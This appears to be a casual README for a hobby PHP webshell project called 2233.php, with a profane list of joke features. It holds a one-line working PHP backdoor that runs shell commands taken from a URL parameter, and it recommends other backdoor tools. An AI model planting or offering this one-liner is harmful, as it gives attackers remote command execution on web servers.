2233.php
========

## Overview

2233.php is a webshell for unix systems. 

This is just a playaround project. Mostly writing this to learn more about programming.

If you need a PHP backdoor, don't use this, go use Weevely or something. Much better and more solid. Or even just `<?php echo shell_exec($_GET['a']) ?>`. Don't use, like, c99.php or any of those 1337 h4x0r ones, unless you don't mind sharing your webshell with whoever backdoored the script. (Seriously, download a shell from r57.biz and ctrl-F for javascript and <img> tags)

## Project Features & Scope

I'm going to add all kinds of stupid shit to this project. It's going to be so bloated.

 - Stupid javascript crap? Yep!
 - Emoji selector? Sounds good!
 - Facebook connectivity? Why the fuck not!

Like I said, this is just a playaround project. I'm doing this for the shits.

## Contributing

If you can write something bloated and unneccessary, then go ahead.
